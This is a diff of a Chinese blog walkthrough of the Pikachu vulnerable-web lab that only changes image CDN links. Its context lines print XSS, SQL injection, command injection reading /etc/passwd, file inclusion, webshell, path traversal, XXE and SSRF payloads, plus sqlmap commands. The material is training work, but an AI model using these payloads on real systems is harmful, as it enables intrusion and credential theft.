@@ -78,19 +78,19 @@ date: 2026-03-05 12:00:00
 
 **🔍 思路：** 随便输入内容并查看页面源代码，定位到按钮触发的 JS 函数。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image1.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image1.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image2.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image2.png)
 
 找到按钮所绑定的函数后：
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image3.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image3.png)
 
 发现参数被拼接到 `<a>` 标签中，可以利用单引号闭合属性来注入事件。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image4.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image4.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image5.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image5.png)
 
 > ⚠️ 注意：一定要使用**英文单引号**，中文单引号无效！
 
@@ -102,11 +102,11 @@ date: 2026-03-05 12:00:00
 
 只需构造闭合，再点击 "xss" 链接：
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image6.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image6.png)
 
 成功触发弹窗 🎉
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image7.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image7.png)
 
 ---
 
@@ -120,9 +120,9 @@ date: 2026-03-05 12:00:00
 ?text=%27%20onclick=eval("alert(%27xss%27);">xss</a>#
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image8.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image8.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image9.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image9.png)
 
 ---
 
@@ -134,21 +134,21 @@ date: 2026-03-05 12:00:00
 
 1. 在前台随意输入内容提交（包含 XSS Payload）
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image10.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image10.png)
 
 2. 登录后台查看留言
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image11.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image11.png)
 
 3. 后台页面触发弹窗 💥
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image12.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image12.png)
 
 4. 查看源代码，可以看到之前写入的 XSS 代码已被执行
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image13.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image13.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image14.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image14.png)
 
 ---
 
@@ -156,7 +156,7 @@ date: 2026-03-05 12:00:00
 
 **📖 概念：** 服务端对脚本标签进行了简单的关键字过滤，但过滤规则不完整，可通过大小写混用绕过。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image15.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image15.png)
 
 **💣 Payload（大小写混用绕过）：**
 
@@ -166,7 +166,7 @@ date: 2026-03-05 12:00:00
 
 成功执行 ✅
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image16.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image16.png)
 
 ---
 
@@ -182,9 +182,9 @@ date: 2026-03-05 12:00:00
 
 **🔍 步骤：** 输入代码没有反应，查看源代码发现输入被放入了 `<a>` 标签的属性中。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image17.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image17.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image18.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image18.png)
 
 发现是 `<a>` 标签中的单引号闭合问题，构造绕过：
 
@@ -196,7 +196,7 @@ date: 2026-03-05 12:00:00
 
 成功触发 🎉
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image19.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image19.png)
 
 ---
 
@@ -211,7 +211,7 @@ date: 2026-03-05 12:00:00
 ' onclick=alert(1111) '
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image20.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image20.png)
 
 **💣 Payload 二（javascript 伪协议）：**
 
@@ -219,7 +219,7 @@ date: 2026-03-05 12:00:00
 javascript:alert(1)
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image21.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image21.png)
 
 两种方式均可成功执行 ✅
 
@@ -237,7 +237,7 @@ javascript:alert(1)
 
 查看源代码后，构造闭合注入：
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image22.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image22.png)
 
 **💣 Payload 一（闭合字符串）：**
 
@@ -245,7 +245,7 @@ javascript:alert(1)
 ';alert(1)//
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image23.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image23.png)
 
 **💣 Payload 二（标签闭合绕过）：**
 
@@ -253,7 +253,7 @@ javascript:alert(1)
 </script><script>alert('xss')</script>
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image24.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image24.png)
 
 两种方式均可成功触发 ✅
 
@@ -271,31 +271,31 @@ javascript:alert(1)
 
 1. 登录一个普通用户账号
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image25.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image25.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image26.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image26.png)
 
 2. 尝试修改个人信息，用 Burp Suite 抓包观察请求
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image27.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image27.png)
 
 3. 发现是 **GET 方式**发送的请求
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image28.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image28.png)
 
 4. 在 Burp 中右键 → 生成 CSRF PoC
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image29.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image29.png)
 
 5. 修改 PoC 中的目标参数后复制链接
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image30.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image30.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image31.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image31.png)
 
 6. 访问构造好的链接后，发现用户信息已被悄悄修改 ✅
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image32.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image32.png)
 
 ---
 
@@ -309,11 +309,11 @@ javascript:alert(1)
 
 **📖 概念：** 添加了随机 Token 验证，理论上无法直接伪造请求。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image33.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image33.png)
 
 **🔍 查看源代码：** 发现 Token 存储在前端 HTML 中
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image34.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image34.png)
 
 > 💡 **绕过思路：** 此处可配合 **XSS 漏洞**，先通过 XSS 读取页面中的 Token 值，再携带 Token 构造 CSRF 请求，实现完整攻击链：`XSS + CSRF`。
 
@@ -331,19 +331,19 @@ javascript:alert(1)
 
 1. 输入数字，页面正常显示
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image35.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image35.png)
 
 2. 输入单引号 `'`，页面报错 → 确认存在注入点
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image36.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image36.png)
 
 3. 使用 `ORDER BY` 探测列数，到 `2` 不报错，说明有 **2 列输出**
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image37.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image37.png)
 
 4. 使用联合注入查询数据库信息
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image38.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image38.png)
 
 **💣 查表名：**
 
@@ -351,7 +351,7 @@ javascript:alert(1)
 id=2 union select group_concat(table_name),2 from information_schema.tables where table_schema='pikachu'
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image39.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image39.png)
 
 **💣 查列名：**
 
@@ -359,7 +359,7 @@ id=2 union select group_concat(table_name),2 from information_schema.tables wher
 id=2 union select group_concat(column_name),2 from information_schema.columns where table_schema='pikachu' and table_name='users'
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image40.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image40.png)
 
 **💣 查数据：**
 
@@ -367,7 +367,7 @@ id=2 union select group_concat(column_name),2 from information_schema.columns wh
 id=2 union select group_concat(username),group_concat(password) from users
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image41.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image41.png)
 
 5. 密码经过 MD5 加密，使用在线工具解密：[https://www.cmd5.com/](https://www.cmd5.com/)
 
@@ -377,7 +377,7 @@ e10adc3949ba59abbe56e057f20f883e → 123456
 e99a18c428cb38d5f260853678922e03 → abc123
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image42.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image42.png)
 
 ---
 
@@ -385,9 +385,9 @@ e99a18c428cb38d5f260853678922e03 → abc123
 
 **🔍 思路：** 参数被单引号包裹，需要用 `'` 闭合原有引号再注入。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image43.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image43.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image44.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image44.png)
 
 **💣 Payload：**
 
@@ -395,7 +395,7 @@ e99a18c428cb38d5f260853678922e03 → abc123
 1' union select group_concat(table_name),2 from information_schema.tables where table_schema=database() #
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image45.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image45.png)
 
 ---
 
@@ -409,7 +409,7 @@ e99a18c428cb38d5f260853678922e03 → abc123
 python sqlmap.py -u "http://pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%90%9C%E7%B4%A2" --batch
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image46.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image46.png)
 
 ---
 
@@ -421,7 +421,7 @@ python sqlmap.py -u "http://pikachu/vul/sqli/sqli_search.php?name=1&submit=%E6%9
 python sqlmap.py -u "http://pikachu/vul/sqli/sqli_x.php?name=1&submit=%E6%9F%A5%E8%AF%A2" --batch
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image47.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image47.png)
 
 ---
 
@@ -433,7 +433,7 @@ python sqlmap.py -u "http://pikachu/vul/sqli/sqli_x.php?name=1&submit=%E6%9F%A5%
 python sqlmap.py -r D:\Backup\桌面\sql.txt --batch
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image48.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image48.png)
 
 ---
 
@@ -441,16 +441,16 @@ python sqlmap.py -r D:\Backup\桌面\sql.txt --batch
 
 **🔍 思路：** 注入点位于 DELETE 语句中，通常通过 ID 参数传入。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image49.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image49.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image50.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image50.png)
 
 ```bash
 # 使用 SQLMap 检测
 python sqlmap.py -r sql.txt --batch
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image51.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image51.png)
 
 ---
 
@@ -458,23 +458,23 @@ python sqlmap.py -r sql.txt --batch
 
 **📖 概念：** 注入点不在 URL 参数中，而是在 HTTP 请求头（如 `User-Agent`、`X-Forwarded-For`、`Cookie` 等）。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image52.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image52.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image53.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image53.png)
 
 > ⚠️ 注意识别正确的包，登录包不是目标，要找**带有 UA 信息的业务包**。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image54.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image54.png)
 
 这个才是目标包 👇
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image55.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image55.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image56.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image56.png)
 
 这是**报错注入**类型：
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image57.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image57.png)
 
 ---
 
@@ -482,13 +482,13 @@ python sqlmap.py -r sql.txt --batch
 
 **📖 概念：** 页面不返回具体数据，只通过 True/False 的响应差异来逐位猜解数据。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image58.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image58.png)
 
 ```bash
 python sqlmap.py -u "目标URL" --batch
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image59.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image59.png)
 
 ---
 
@@ -496,13 +496,13 @@ python sqlmap.py -u "目标URL" --batch
 
 **📖 概念：** 注入后通过 `sleep()` 函数造成响应延迟，根据响应时间判断条件真假，逐步提取数据。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image60.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image60.png)
 
 ```bash
 python sqlmap.py -u "目标URL" --batch
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image61.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image61.png)
 
 ---
 
@@ -516,7 +516,7 @@ python sqlmap.py -u "目标URL" --batch
 name=1%df' union select version(),database() #
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image62.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image62.png)
 
 ---
 
@@ -537,7 +537,7 @@ name=1%df' union select version(),database() #
 127.0.0.1 | cat /etc/passwd
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image63.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image63.png)
 
 ---
 
@@ -553,7 +553,7 @@ phpinfo();
 
 直接执行，页面返回完整 phpinfo 信息 ✅
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image64.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image64.png)
 
 ---
 
@@ -583,7 +583,7 @@ http://pikachu/vul/fileinclude/fi_local.php?filename=../../../../../../1.php&sub
 <?php phpinfo(); ?>
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image65.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image65.png)
 
 ---
 
@@ -597,7 +597,7 @@ http://pikachu/vul/fileinclude/fi_local.php?filename=../../../../../../1.php&sub
 http://pikachu/vul/fileinclude/fi_remote.php?filename=http://baidu.com&submit=提交
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image66.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image66.png)
 
 > 💡 实战中可将 `filename` 参数指向包含 Webshell 的远程服务器，获取权限。
 
@@ -607,7 +607,7 @@ http://pikachu/vul/fileinclude/fi_remote.php?filename=http://baidu.com&submit=�
 
 **📖 概念：** 文件下载接口的 `filename` 参数未过滤，可通过路径穿越读取任意文件。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image67.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image67.png)
 
 **💣 构造路径穿越下载源码：**
 
@@ -615,7 +615,7 @@ http://pikachu/vul/fileinclude/fi_remote.php?filename=http://baidu.com&submit=�
 unsafedownload/execdownload.php?filename=../../../index.php
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image68.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image68.png)
 
 ---
 
@@ -625,19 +625,19 @@ unsafedownload/execdownload.php?filename=../../../index.php
 
 **🔍 查看源代码，确认是前端检测：**
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image69.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image69.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image70.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image70.png)
 
 **🔍 步骤：**
 
 1. 在浏览器中禁用 JavaScript
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image71.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image71.png)
 
 2. 再次上传 `.php` 文件，已无校验限制
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image72.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image72.png)
 
 3. 访问上传路径，执行成功 ✅
 
@@ -645,7 +645,7 @@ unsafedownload/execdownload.php?filename=../../../index.php
 http://pikachu/vul/unsafeupload/uploads/1.php
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image73.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image73.png)
 
 ---
 
@@ -655,7 +655,7 @@ http://pikachu/vul/unsafeupload/uploads/1.php
 
 **📖 概念：** 服务端检测 `Content-Type` 字段，在 Burp Suite 中将其修改为 `image/png` 即可绕过。
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image74.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image74.png)
 
 #### getimagesize() 图片头检测绕过
 
@@ -666,9 +666,9 @@ http://pikachu/vul/unsafeupload/uploads/1.php
 copy normal.png /b + shell.php /a webshell.png
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image75.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image75.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image76.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image76.png)
 
 > ⚠️ 注意：上传后文件后缀为 `.png`，无法直接用工具连接 Webshell。需结合**文件包含漏洞**，通过包含图片马来触发执行。
 
@@ -688,9 +688,9 @@ copy normal.png /b + shell.php /a webshell.png
 
 1. 登录账号，查看个人信息
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image77.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image77.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image78.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image78.png)
 
 2. 观察 URL 参数：
 
@@ -704,7 +704,7 @@ http://pikachu/vul/overpermission/op1/op1_mem.php?username=lucy&submit=点击查
 http://pikachu/vul/overpermission/op1/op1_mem.php?username=lili&submit=点击查看个人信息
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image79.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image79.png)
 
 ---
 
@@ -716,11 +716,11 @@ http://pikachu/vul/overpermission/op1/op1_mem.php?username=lili&submit=点击查
 
 1. 分别登录普通用户 `pikachu` 和管理员 `Admin`，对比页面差异
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image80.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image80.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image81.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image81.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image82.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image82.png)
 
 2. 管理员点击"添加用户"时，URL 为：
 
@@ -730,9 +730,9 @@ http://pikachu/vul/overpermission/op2/op2_admin_edit.php
 
 3. 切换回 `pikachu` 普通用户的 Cookie，直接访问该 URL，成功操作管理员功能 ✅
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image83.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image83.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image84.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image84.png)
 
 ---
 
@@ -752,7 +752,7 @@ http://pikachu/vul/dir/dir_list.php?title=jarheads.php
 http://pikachu/vul/dir/dir_list.php?title=../../../../../../1.php
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image85.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image85.png)
 
 ---
 
@@ -762,9 +762,9 @@ http://pikachu/vul/dir/dir_list.php?title=../../../../../../1.php
 
 **🔍 直接查看页面源代码即可发现：**
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image86.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image86.png)
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image87.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image87.png)
 
 ---
 
@@ -848,7 +848,7 @@ O:1:"S":1:{s:4:"test";s:27:"<script>alert(111)</script>";}
 
 提交后成功触发 XSS ✅
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image88.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image88.png)
 
 ---
 
@@ -866,7 +866,7 @@ O:1:"S":1:{s:4:"test";s:27:"<script>alert(111)</script>";}
 <a>&xxe;</a>
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image89.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image89.png)
 
 ---
 
@@ -880,7 +880,7 @@ O:1:"S":1:{s:4:"test";s:27:"<script>alert(111)</script>";}
 http://pikachu/vul/urlredirect/urlredirect.php?url=http://baidu.com
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image90.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image90.png)
 
 ---
 
@@ -900,7 +900,7 @@ http://pikachu/vul/urlredirect/urlredirect.php?url=http://baidu.com
 http://pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/1.php
 ```
 
-![](https://cdn.jsdelivr.net/gh/Tjsdrj/BlogImage@main/img/image91.png)
+![](https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/image91.png)
 
 ---
 
